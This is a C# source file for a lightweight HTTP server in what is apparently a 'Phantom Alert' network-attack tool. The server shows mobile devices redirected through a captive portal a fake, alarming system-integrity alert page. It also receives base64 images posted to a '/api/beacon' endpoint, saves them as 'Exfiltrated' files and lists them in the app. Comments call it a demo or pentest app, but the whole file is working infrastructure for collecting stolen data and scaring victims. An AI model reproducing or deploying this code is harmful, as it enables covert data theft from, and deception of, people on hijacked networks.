using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace MyNet.Core
{
    /// <summary>
    /// A lightweight HTTP server to host the 'Phantom Alert' message.
    /// Served to redirected mobile devices to trigger the native system popup.
    /// </summary>
    public class LocalServer : IDisposable
    {
        private HttpListener? _listener;
        private string _customMessage = "CRITICAL: Device Integrity Violation Detected.";
        private MainViewModel _vm;

        public LocalServer(MainViewModel vm)
        {
            _vm = vm;
        }

        public void Start(int port)
        {
            _listener = new HttpListener();
            _listener.Prefixes.Add($"http://*:{port}/");
            _listener.Start();
            _ = Task.Run(ListenLoop);
        }

        public void SetMessage(string message)
        {
            _customMessage = message;
        }

        private async Task ListenLoop()
        {
            while (_listener?.IsListening == true)
            {
                try
                {
                    var context = await _listener.GetContextAsync();
                    var request = context.Request;
                    var response = context.Response;

                    // BEACON HANDLER: Receive simulated exfiltration data
                    if (request.HttpMethod == "POST" && request.Url?.AbsolutePath == "/api/beacon")
                    {
                        using var reader = new StreamReader(request.InputStream, request.ContentEncoding ?? Encoding.UTF8);
                        string body = await reader.ReadToEndAsync();
                        
                        // Log the beacon arrival
                        Console.WriteLine($"[BEACON] Incoming data from {request.RemoteEndPoint?.Address}");
                        
                        // SIMPLE PARSING (Regex for demo/pentest app simplicity)
                        var match = System.Text.RegularExpressions.Regex.Match(body, "data=([^&]+)");
                        if (match.Success)
                        {
                            string base64 = Uri.UnescapeDataString(match.Groups[1].Value);
                            byte[] imageData = Convert.FromBase64String(base64);
                            
                            string fileName = $"Exfiltrated_{DateTime.Now:HHmmss}_{Guid.NewGuid().ToString().Substring(0,4)}.jpg";
                            string savePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Exfiltrated", fileName);
                            
                            Directory.CreateDirectory(Path.GetDirectoryName(savePath)!);
                            File.WriteAllBytes(savePath, imageData);
                            
                            // Update UI
                            System.Windows.Application.Current.Dispatcher.Invoke(() =>
                            {
                                _vm.ExfiltratedImages.Insert(0, new ExfiltratedImage 
                                { 
                                    FileName = fileName, 
                                    FullPath = savePath, 
                                    Timestamp = DateTime.Now 
                                });
                            });
                            
                            Console.WriteLine($"[SAVED] {fileName} to {savePath}");
                        }
                        
                        string ack = "{\"status\":\"success\",\"message\":\"Beacon processed\"}";
                        byte[] ackBuffer = Encoding.UTF8.GetBytes(ack);
                        response.ContentType = "application/json";
                        response.ContentLength64 = ackBuffer.Length;
                        await response.OutputStream.WriteAsync(ackBuffer, 0, ackBuffer.Length);
                        response.Close();
                        continue;
                    }

                    // Most Captive Portal checks expect a 200 OK with specific content or just ANY page.
                    // We serve a 'scary' looking system page.
                    string html = $@"
                    <html>
                    <head>
                        <title>System Identity Alert</title>
                        <meta name='viewport' content='width=device-width, initial-scale=1'>
                        <style>
                            body {{ background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }}
                            .box {{ border: 1px solid #0f0; padding: 20px; margin-top: 50px; box-shadow: 0 0 15px #0f0; }}
                            h1 {{ color: #f00; text-shadow: 0 0 5px #f00; }}
                            .blink {{ animation: blinker 1s linear infinite; font-weight: bold; color: #f00; }}
                            @keyframes blinker {{ 50% {{ opacity: 0; }} }}
                        </style>
                    </head>
                    <body>
                        <div class='box'>
                            <h1>[ SYSTEM ALERT ]</h1>
                            <p class='blink'>TERMINAL ACCESS DETECTED</p>
                            <hr/>
                            <p style='font-size: 1.2em;'>{_customMessage}</p>
                            <hr/>
                            <p style='font-size: 0.8em; color: #666;'>Log: Connection source 0x4A..FB captured.</p>
                        </div>
                    </body>
                    </html>";

                    byte[] buffer = Encoding.UTF8.GetBytes(html);
                    response.ContentLength64 = buffer.Length;
                    using var output = response.OutputStream;
                    await output.WriteAsync(buffer, 0, buffer.Length);
                }
                catch { }
            }
        }

        public void Dispose()
        {
            _listener?.Stop();
            _listener?.Close();
        }
    }
}
